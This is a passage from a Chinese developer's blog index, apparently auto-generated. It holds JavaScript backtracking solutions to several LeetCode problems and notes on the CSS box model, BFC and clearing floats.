rel="noopener">leetcode40</a></li><li><a href="https://leetcode-cn.com/problems/combination-sum-ii/solution/man-tan-wo-li-jie-de-hui-su-chang-wen-shou-hua-tu-/" target="_blank" rel="noopener">题解</a></li></ul><blockquote><p>接上题，每个数字只可使用一次</p><p><strong>示例 1:</strong></p><p>输入: candidates = [10,1,2,7,6,1,5], target = 8,<br>所求解集为:<br>[<br>  [1, 7],<br>  [1, 2, 5],<br>  [2, 6],<br>  [1, 1, 6]<br>]</p><p><strong>示例 2:</strong></p><p>输入: candidates = [2,5,2,1,2], target = 5,<br>所求解集为:<br>[<br>  [1,2,2],<br>  [5]<br>]</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> combinationSum2 <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>candidates<span class="token punctuation">,</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>    candidates<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> a <span class="token operator">-</span> b <span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 升序排序</span>    <span class="token keyword">const</span> res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> traceback <span class="token operator">=</span> <span class="token punctuation">(</span>start<span class="token punctuation">,</span> path<span class="token punctuation">,</span> sum<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">></span> target<span class="token punctuation">)</span> <span class="token keyword">return</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>sum <span class="token operator">===</span> target<span class="token punctuation">)</span> <span class="token punctuation">{</span>            res<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> start<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> candidates<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">>=</span> start <span class="token operator">&amp;&amp;</span> candidates<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">==</span> candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 当前选项和左邻选项一样，跳过</span>                <span class="token keyword">continue</span>            <span class="token punctuation">}</span>            path<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            <span class="token function">traceback</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> path<span class="token punctuation">,</span> sum <span class="token operator">+</span> candidates<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>            path<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">traceback</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="单词搜索"><a href="#单词搜索" class="headerlink" title="单词搜索"></a>单词搜索</h2><ul><li><a href="https://leetcode-cn.com/problems/word-search/" target="_blank" rel="noopener">leetcode79</a></li><li><a href="https://leetcode-cn.com/problems/word-search/solution/shou-hua-tu-jie-79-dan-ci-sou-suo-dfs-si-lu-de-cha/" target="_blank" rel="noopener">题解</a></li></ul><blockquote><p>给定一个二维网格和一个单词，找出该单词是否存在于网格中。</p><p>单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。</p><p>示例:</p><p>board =<br>[<br>  [‘A’,’B’,’C’,’E’],<br>  [‘S’,’F’,’C’,’S’],<br>  [‘A’,’D’,’E’,’E’]<br>]</p><p>给定 word = “ABCCED”, 返回 true<br>给定 word = “SEE”, 返回 true<br>给定 word = “ABCB”, 返回 false</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> exist <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>board<span class="token punctuation">,</span> word<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">const</span> m <span class="token operator">=</span> board<span class="token punctuation">.</span>length    <span class="token keyword">const</span> n <span class="token operator">=</span> board<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>length    <span class="token keyword">const</span> used <span class="token operator">=</span> Array<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">=</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">fill</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">const</span> traceback <span class="token operator">=</span> <span class="token punctuation">(</span>row<span class="token punctuation">,</span> col<span class="token punctuation">,</span> i<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>i <span class="token operator">==</span> word<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 越界</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>row <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> row <span class="token operator">>=</span> m <span class="token operator">||</span> col <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token operator">||</span> col <span class="token operator">>=</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 已访问或不匹配</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>used<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">||</span> board<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">!=</span> word<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">false</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 匹配记录一下当前点被访问了</span>      used<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span>      <span class="token keyword">const</span> canFindRest <span class="token operator">=</span> <span class="token function">traceback</span><span class="token punctuation">(</span>row <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> col<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">traceback</span><span class="token punctuation">(</span>row <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> col<span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>                     <span class="token operator">||</span> <span class="token function">traceback</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> col <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token function">traceback</span><span class="token punctuation">(</span>row<span class="token punctuation">,</span> col <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true">// 能找到路径</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>canFindRest<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token boolean">true</span>      <span class="token punctuation">}</span>      <span class="token comment" spellcheck="true">// 找不到路径</span>      used<span class="token punctuation">[</span>row<span class="token punctuation">]</span><span class="token punctuation">[</span>col<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">false</span>      <span class="token keyword">return</span> <span class="token boolean">false</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 找入口</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>board<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">==</span> word<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">traceback</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>         <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="三角形的最小路径和"><a href="#三角形的最小路径和" class="headerlink" title="三角形的最小路径和"></a>三角形的最小路径和</h2><ul><li><a href="https://leetcode-cn.com/problems/triangle/" target="_blank" rel="noopener">leetcode120</a></li></ul><pre class=" language-js"><code class="language-js">输入：triangle <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">]</span>输出：<span class="token number">11</span>解释：如下面简图所示：   <span class="token number">2</span>  <span class="token number">3</span> <span class="token number">4</span> <span class="token number">6</span> <span class="token number">5</span> <span class="token number">7</span><span class="token number">4</span> <span class="token number">1</span> <span class="token number">8</span> <span class="token number">3</span>自顶向下的最小路径和为 <span class="token number">11</span>（即，<span class="token number">2</span> <span class="token operator">+</span> <span class="token number">3</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">11</span>）。</code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> minimumTotal <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>triangle<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">let</span> res <span class="token operator">=</span> <span class="token number">999999</span>    <span class="token comment" spellcheck="true">// path: 路径和 | n: 记录第几层 | index: 当前层选中的index</span>    <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> n<span class="token punctuation">,</span> index<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>n <span class="token operator">></span> triangle<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            res <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>res<span class="token punctuation">,</span> path<span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token function">backtrack</span><span class="token punctuation">(</span>path <span class="token operator">+</span> triangle<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> index<span class="token punctuation">)</span>        <span class="token function">backtrack</span><span class="token punctuation">(</span>path <span class="token operator">+</span> triangle<span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">[</span>index<span class="token punctuation">]</span><span class="token punctuation">,</span> n <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> index <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token function">backtrack</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> res<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><p><strong>回溯思路可行，但是给的测试用例会超时，更优的解法应该是<a href="https://jinjingxuan.github.io/2020/11/16/%E7%AE%97%E6%B3%95-%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/" target="_blank" rel="noopener">dp</a></strong></p><h2 id="路径总和"><a href="#路径总和" class="headerlink" title="路径总和"></a>路径总和</h2><ul><li><a href="https://leetcode-cn.com/problems/path-sum/" target="_blank" rel="noopener">leetcode112</a></li></ul><blockquote><p>给你二叉树的根节点 root 和一个表示目标和的整数 targetSum ，判断该树中是否存在 根节点到叶子节点 的路径，这条路径上所有节点值相加等于目标和 targetSum 。</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// ans 甚至可以求究竟有几条路径</span><span class="token keyword">var</span> hasPathSum <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> targetSum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token number">0</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token number">0</span>    <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> num<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">===</span> targetSum <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span>left <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span>right <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ans <span class="token operator">+</span><span class="token operator">=</span> <span class="token number">1</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>left <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>left<span class="token punctuation">,</span> num <span class="token operator">+</span> path<span class="token punctuation">.</span>left<span class="token punctuation">.</span>val<span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>right <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>right<span class="token punctuation">,</span> num <span class="token operator">+</span> path<span class="token punctuation">.</span>right<span class="token punctuation">.</span>val<span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">backtrack</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> root<span class="token punctuation">.</span>val<span class="token punctuation">)</span>    <span class="token keyword">return</span> ans <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre><h2 id="路径总和II"><a href="#路径总和II" class="headerlink" title="路径总和II"></a>路径总和II</h2><ul><li><a href="https://leetcode-cn.com/problems/path-sum-ii/" target="_blank" rel="noopener">leetcode113</a></li></ul><pre class=" language-js"><code class="language-js">给定一个二叉树和一个目标和，找到所有从根节点到叶子节点路径总和等于给定目标和的路径。示例<span class="token punctuation">:</span>给定如下二叉树，以及目标和 sum <span class="token operator">=</span> <span class="token number">22</span>，              <span class="token number">5</span>             <span class="token operator">/</span> \            <span class="token number">4</span>   <span class="token number">8</span>           <span class="token operator">/</span>   <span class="token operator">/</span> \          <span class="token number">11</span>  <span class="token number">13</span>  <span class="token number">4</span>         <span class="token operator">/</span>  \    <span class="token operator">/</span> \        <span class="token number">7</span>    <span class="token number">2</span>  <span class="token number">5</span>   <span class="token number">1</span>返回<span class="token punctuation">:</span><span class="token punctuation">[</span>   <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>   <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span></code></pre><pre class=" language-js"><code class="language-js"><span class="token keyword">var</span> pathSum <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> targetSum<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>root<span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">let</span> ans <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">const</span> backtrack <span class="token operator">=</span> <span class="token punctuation">(</span>path<span class="token punctuation">,</span> num<span class="token punctuation">,</span> arr<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>num <span class="token operator">===</span> targetSum <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span>left <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">&amp;&amp;</span> path<span class="token punctuation">.</span>right <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            ans<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>arr<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">return</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>left <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>left<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>left<span class="token punctuation">,</span> num <span class="token operator">+</span> path<span class="token punctuation">.</span>left<span class="token punctuation">.</span>val<span class="token punctuation">,</span> arr<span class="token punctuation">)</span>            arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>path<span class="token punctuation">.</span>right <span class="token operator">!==</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            arr<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>right<span class="token punctuation">.</span>val<span class="token punctuation">)</span>            <span class="token function">backtrack</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span>right<span class="token punctuation">,</span> num <span class="token operator">+</span> path<span class="token punctuation">.</span>right<span class="token punctuation">.</span>val<span class="token punctuation">,</span> arr<span class="token punctuation">)</span>            arr<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">backtrack</span><span class="token punctuation">(</span>root<span class="token punctuation">,</span> root<span class="token punctuation">.</span>val<span class="token punctuation">,</span> <span class="token punctuation">[</span>root<span class="token punctuation">.</span>val<span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> ans<span class="token punctuation">}</span><span class="token punctuation">;</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>盒子模型</title>
      <link href="2020/11/26/CSS-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/"/>
      <url>2020/11/26/CSS-%E7%9B%92%E5%AD%90%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<ul><li>盒子模型</li><li>脱离文档流</li><li>BFC</li><li>清除浮动</li></ul><h2 id="盒子模型"><a href="#盒子模型" class="headerlink" title="盒子模型"></a>盒子模型</h2><ul><li>w3c标准盒模型<ul><li>包括 width, height, margin, padding, border</li><li>可视宽度是 width + padding + border</li><li>box-sizing: content-box;</li></ul></li><li>ie盒模型<ul><li>也包括 width, height, margin, padding, border</li><li>可视宽度 width</li><li>box-sizing: border-box;</li></ul></li></ul><h2 id="脱离文档流"><a href="#脱离文档流" class="headerlink" title="脱离文档流"></a>脱离文档流</h2><ul><li>所谓的<strong>文档流</strong>，指的是元素排版布局过程中，元素会自动从左往右，从上往下的流式排列。</li><li><strong>脱离文档流</strong>，也就是将元素从普通的布局排版中拿走，其他盒子在定位的时候，会当做脱离文档流的元素不存在而进行定位。</li><li><strong>浮动 ( float ) 和绝对定位 ( position:absolute )</strong><ul><li>均脱离文档流</li><li>均不占位</li><li>浮动情况下，其他元素会自动在其右边排列。绝对定位会完全忽视其存在。</li></ul></li></ul><h2 id="BFC"><a href="#BFC" class="headerlink" title="BFC"></a>BFC</h2><ul><li>BFC的定义:</li></ul><pre class=" language-js"><code class="language-js">BFC（Block formatting context ）“块级格式上下文”。 是用于布局块级盒子的一块渲染区域。并且与这个区域的外部毫无关系。</code></pre><ul><li>BFC的布局规则</li></ul><pre class=" language-js"><code class="language-js"> 内部的Box会在垂直方向，一个接一个地放置。 Box垂直方向的距离由margin决定。属于同一个BFC的两个相邻Box的margin会发生重叠。 每个盒子（块盒与行盒）的margin box的左边，与包含块border <span class="token function">box的左边相接触</span><span class="token punctuation">(</span>对于从左往右的格式化，否则相反<span class="token punctuation">)</span>。即使存在浮动也是如此。 BFC的区域不会与float box重叠。 BFC就是页面上的一个隔离的独立容器，容器里面的子元素不会影响到外面的元素。反之也如此。 计算BFC的高度时，浮动元素也参与计算。</code></pre><ul><li>触发BFC的条件:</li></ul><pre class=" language-js"><code class="language-js">满足下列条件之一就可以触发BFC <span class="token number">1</span>：根元素，即html元素 <span class="token number">2</span>：float的值不为none <span class="token number">3</span>：overflow的值不为visible <span class="token number">4</span>：display的值为inline<span class="token operator">-</span>block、table<span class="token operator">-</span>cell、table<span class="token operator">-</span>caption <span class="token number">5</span>：position的值为absolute或者fixed</code></pre><ul><li>BFC的作用</li></ul><p>（1）<strong>可以阻止元素被浮动的元素覆盖</strong>（可做两栏布局自适应）</p><p><a href="https://img-blog.csdnimg.cn/20190428161126130.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428161126130.png" alt="1"></a></p><p> 触发红色盒子的BFC后</p><p><a href="https://img-blog.csdnimg.cn/20190428161306268.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428161306268.png" alt="2"></a></p><p>（2）<strong>解决高度塌陷</strong>：我们知道当浮动的盒子的父元素没有高度时，会出现高度塌陷现象。</p><p><a href="https://img-blog.csdnimg.cn/20190428162141491.png" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428162141491.png" alt="3"></a></p><p> 父盒子触发BFC可以解决这个问题,根据布局规则的最后一条。</p><p>（3）<strong>解决同一个BFC区域的垂直方向margin塌陷的问题</strong></p><p><a href="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" target="_blank" rel="noopener"><img src="https://img-blog.csdnimg.cn/20190428165048481.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQxMjU3MTI5,size_16,color_FFFFFF,t_70" alt="4"></a></p><p> 分为两个不同的BFC之后可以解决</p><h2 id="清除浮动"><a href="#清除浮动" class="headerlink" title="清除浮动"></a>清除浮动</h2><ul><li>给父盒子添加高度</li><li>在浮动元素后使用一个空元素如<code>&lt;div class=&quot;clear&quot;&gt;&lt;/div&gt;</code>，并在CSS中赋予<code>.clear{clear:both;}</code>属性即可清理浮动。</li><li>父盒子设置<code>overflew</code>不为<code>visible</code>，触发父盒子的<code>BFC</code>，浮动元素也参与高度计算</li><li>:after伪元素，给浮动元素的容器添加一个clearfix的class，然后给这个class添加一个:after伪元素实现元素末尾添加一个看不见的块元素清理浮动。</li></ul><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.clearfix</span><span class="token pseudo-element">:after</span></span><span class="token punctuation">{</span>  <span class="token property">content</span><span class="token punctuation">:</span> <span class="token string">"020"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">/*content设置成一个看不见的空格*/</span>  <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>   <span class="token property">height</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">;</span>   <span class="token property">clear</span><span class="token punctuation">:</span> both<span class="token punctuation">;</span>   <span class="token property">visibility</span><span class="token punctuation">:</span> hidden<span class="token punctuation">;</span>  <span class="token punctuation">}</span></code></pre><p>通过上面的例子，我们不难发现清除浮动的方法可以分成两类：</p><ol><li><p>利用 clear 属性，包括在浮动元素末尾添加一个带有 clear: both 属性的空 div 来闭合元素，其实利用 :after 伪元素的方法也是在元素末尾添加一个内容为一个点并带有 clear: both 属性的元素实现的。</p></li><li><p>触发浮动元素父元素的 BFC (Block Formatting Contexts, 块级格式化上下文)，使到该父元素可以包含浮动元素，关于这一点。</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CSS </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>浏览器渲染相关</title>
      <link href="2020/11/23/%E6%B5%8F%E8%A7%88%E5%99%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E7%9B%B8%E5%85%B3/"/>
      <url>2020/11/23/%E6%B5%8F%E8%A7%88%E5%99%A8-%E6%B5%8F%E8%A7%88%E5%99%A8%E6%B8%B2%E6%9F%93%E7%9B%B8%E5%85%B3/</url>
      
